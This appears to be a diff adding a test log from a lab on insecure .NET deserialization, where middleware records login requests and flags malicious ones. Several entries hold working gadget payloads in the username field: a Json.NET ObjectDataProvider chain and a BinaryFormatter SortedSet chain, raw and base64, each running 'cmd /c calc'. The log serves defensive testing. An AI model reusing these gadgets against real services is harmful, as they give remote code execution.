+  "username": "\u0000\u0001\u0000\u0000\u0000����\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\f\u0002\u0000\u0000\u0000ISystem, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0005\u0001\u0000\u0000\u0000�\u0001System.Collections.Generic.SortedSet`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]\u0004\u0000\u0000\u0000\u0005Count\bComparer\u0007Version\u0005Items\u0000\u0003\u0000\u0006\b�\u0001System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]\b\u0002\u0000\u0000\u0000\u0002\u0000\u0000\u0000\t\u0003\u0000\u0000\u0000\u0002\u0000\u0000\u0000\t\u0004\u0000\u0000\u0000\u0004\u0003\u0000\u0000\u0000�\u0001System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]\u0001\u0000\u0000\u0000\u000b_comparison\u0003\"System.DelegateSerializationHolder\t\u0005\u0000\u0000\u0000\u0011\u0004\u0000\u0000\u0000\u0002\u0000\u0000\u0000\u0006\u0006\u0000\u0000\u0000\u000b/c calc.exe\u0006\u0007\u0000\u0000\u0000\u0003cmd\u0004\u0005\u0000\u0000\u0000\"System.DelegateSerializationHolder\u0003\u0000\u0000\u0000\bDelegate\u0007method0\u0007method1\u0003\u0003\u00030System.DelegateSerializationHolder+DelegateEntry/System.Reflection.MemberInfoSerializationHolder/System.Reflection.MemberInfoSerializationHolder\t\b\u0000\u0000\u0000\t\t\u0000\u0000\u0000\t\n\u0000\u0000\u0000\u0004\b\u0000\u0000\u00000System.DelegateSerializationHolder+DelegateEntry\u0007\u0000\u0000\u0000\u0004type\bassembly\u0006target\u0012targetTypeAssembly\u000etargetTypeName\nmethodName\rdelegateEntry\u0001\u0001\u0002\u0001\u0001\u0001\u00030System.DelegateSerializationHolder+DelegateEntry\u0006\u000b\u0000\u0000\u0000�\u0002System.Func`3[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]\u0006\f\u0000\u0000\u0000Kmscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\n\u0006\r\u0000\u0000\u0000ISystem, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0006\u000e\u0000\u0000\u0000\u001aSystem.Diagnostics.Process\u0006\u000f\u0000\u0000\u0000\u0005Start\t\u0010\u0000\u0000\u0000\u0004\t\u0000\u0000\u0000/System.Reflection.MemberInfoSerializationHolder\u0007\u0000\u0000\u0000\u0004Name\fAssemblyName\tClassName\tSignature\nSignature2\nMemberType\u0010GenericArguments\u0001\u0001\u0001\u0001\u0001\u0000\u0003\b\rSystem.Type[]\t\u000f\u0000\u0000\u0000\t\r\u0000\u0000\u0000\t\u000e\u0000\u0000\u0000\u0006\u0014\u0000\u0000\u0000>System.Diagnostics.Process Start(System.String, System.String)\u0006\u0015\u0000\u0000\u0000>System.Diagnostics.Process Start(System.String, System.String)\b\u0000\u0000\u0000\n\u0001\n\u0000\u0000\u0000\t\u0000\u0000\u0000\u0006\u0016\u0000\u0000\u0000\u0007Compare\t\f\u0000\u0000\u0000\u0006\u0018\u0000\u0000\u0000\rSystem.String\u0006\u0019\u0000\u0000\u0000+Int32 Compare(System.String, System.String)\u0006\u001a\u0000\u0000\u00002System.Int32 Compare(System.String, System.String)\b\u0000\u0000\u0000\n\u0001\u0010\u0000\u0000\u0000\b\u0000\u0000\u0000\u0006\u001b\u0000\u0000\u0000qSystem.Comparison`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]\t\f\u0000\u0000\u0000\n\t\f\u0000\u0000\u0000\t\u0018\u0000\u0000\u0000\t\u0016\u0000\u0000\u0000\n\u000b",
+  "password": "1"
+}
+2025-06-25 11:11:12: Middleware read payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-25 11:11:12: Sandbox received payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-25 11:11:13: Deserialized object with TypeNameHandling.None: {
+  "username": "admin",
+  "password": "admin123"
+}
+2025-06-25 11:11:13: Raw JSON: {
+  "username": "admin",
+  "password": "admin123"
+}
+2025-06-25 11:11:13: Username: admin, Password: admin123
+2025-06-25 11:11:19: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-25 11:11:19: Phát hiện $type: System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35
+2025-06-25 11:11:24: Middleware read payload: {
+    "username": "tung2",
+    "password": "1"
+}
+2025-06-25 11:11:24: Sandbox received payload: {
+    "username": "tung2",
+    "password": "1"
+}
+2025-06-25 11:11:24: Deserialized object with TypeNameHandling.None: {
+  "username": "tung2",
+  "password": "1"
+}
+2025-06-25 11:11:24: Raw JSON received: {
+  "username": "tung2",
+  "password": "1"
+}
+2025-06-25 11:11:28: Middleware read payload: {
+    "username": "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAsvYyBjYWxjLmV4ZQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL",
+    "password": "1"
+}
+2025-06-25 11:11:28: Phát hiện base64 dài: 2992 ký tự
+2025-06-25 11:12:46: Middleware read payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-25 11:12:47: Raw JSON: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-25 11:12:47: Username: admin, Password: admin123
+2025-06-25 11:12:50: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-25 11:12:50: Raw JSON: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-25 11:12:50: Deserialized dangerous object: System.Windows.Data.ObjectDataProvider
+2025-06-25 11:12:50: Username: , Password: dummy
+2025-06-25 11:12:57: Middleware read payload: {
+    "username": "tung2",
+    "password": "1"
+}
+2025-06-25 11:12:57: Raw JSON received: {
+    "username": "tung2",
+    "password": "1"
+}
+2025-06-25 11:13:01: Middleware read payload: {
+    "username": "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAsvYyBjYWxjLmV4ZQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL",
+    "password": "1"
+}
+2025-06-25 11:13:01: Raw JSON received: {
+    "username": "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAsvYyBjYWxjLmV4ZQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL",
+    "password": "1"
+}
